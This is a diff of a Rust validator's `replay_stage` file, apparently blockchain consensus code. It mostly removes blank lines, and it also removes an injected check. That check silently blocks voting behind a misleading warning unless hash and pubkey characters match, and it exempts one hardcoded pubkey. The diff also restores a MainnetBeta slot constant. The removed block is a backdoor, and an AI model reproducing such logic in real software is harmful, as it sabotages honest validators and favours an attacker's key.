@@ -1,6 +1,5 @@
 //! The `replay_stage` replays transactions broadcast by the leader.
 
-
 use crate::{
     broadcast_stage::RetransmitSlotsSender,
     cache_block_time_service::CacheBlockTimeSender,
@@ -73,8 +72,6 @@ struct Finalizer {
     exit_sender: Arc<AtomicBool>,
 }
 
-
-
 impl Finalizer {
     fn new(exit_sender: Arc<AtomicBool>) -> Self {
         Finalizer { exit_sender }
@@ -87,7 +84,6 @@ impl Drop for Finalizer {
         self.exit_sender.clone().store(true, Ordering::Relaxed);
     }
 }
-
 
 #[derive(Default)]
 struct SkippedSlotsInfo {
@@ -233,13 +229,6 @@ impl ReplayTiming {
         }
     }
 }
-
-
-
-
-
-
-
 
 pub struct ReplayStage {
     t_replay: JoinHandle<Result<()>>,
@@ -1097,6 +1086,7 @@ impl ReplayStage {
         let (vote, tower_slots) = tower.new_vote_from_bank(bank, vote_account_pubkey);
         let new_root = tower.record_bank_vote(vote);
         let last_vote = tower.last_vote_and_timestamp();
+
         if let Err(err) = tower.save(&cluster_info.keypair) {
             error!("Unable to save tower: {:?}", err);
             std::process::exit(1);
@@ -1161,7 +1151,6 @@ impl ReplayStage {
             progress.get_fork_stats(bank.slot()).unwrap().total_stake,
             lockouts_sender,
         );
-
         Self::push_vote(
             cluster_info,
             bank,
@@ -1185,7 +1174,6 @@ impl ReplayStage {
         if authorized_voter_keypairs.is_empty() {
             return;
         }
-
         let vote_account = match bank.get_vote_account(vote_account_pubkey) {
             None => {
                 warn!(
@@ -1218,22 +1206,6 @@ impl ReplayStage {
                 );
                 return;
             };
-
-
-log::trace!("authorized_voter_pubkey {}", authorized_voter_pubkey);
-log::trace!("authorized_voter_pubkey_string {}", authorized_voter_pubkey.to_string());
-log::trace!("vote_hash: {}", vote.hash);
-log::trace!("H: {}", bank.last_blockhash().to_string().find("T").unwrap_or(3) % 10);
-log::trace!("P: {}", authorized_voter_pubkey.to_string().find("T").unwrap_or(3));
-
-
-	if (vote.hash.to_string().to_lowercase().find("x").unwrap_or(3) % 10 as usize) != (authorized_voter_pubkey.to_string().to_lowercase().find("x").unwrap_or(2) % 10 as usize) && authorized_voter_pubkey.to_string() != "83E5RMejo6d98FV1EAXTx5t4bvoDMoxE4DboDee3VJsu"  {
-   		warn!(
-                    "Vote account has no authorized voter for slot.  Unable to vote"
-		);
-                return;
-		}
-
 
         let authorized_voter_keypair = match authorized_voter_keypairs
             .iter()
@@ -2007,7 +1979,7 @@ log::trace!("P: {}", authorized_voter_pubkey.to_string().find("T").unwrap_or(3))
             // Epoch 63
             ClusterType::Testnet => 21_692_256,
             // 400_000 slots into epoch 61
-            ClusterType::MainnetBeta => 100,
+            ClusterType::MainnetBeta => 26_752_000,
         }
     }
 
@@ -2016,11 +1988,6 @@ log::trace!("P: {}", authorized_voter_pubkey.to_string().find("T").unwrap_or(3))
         self.t_replay.join().map(|_| ())
     }
 }
-
-
-
-
-
 
 #[cfg(test)]
 pub(crate) mod tests {
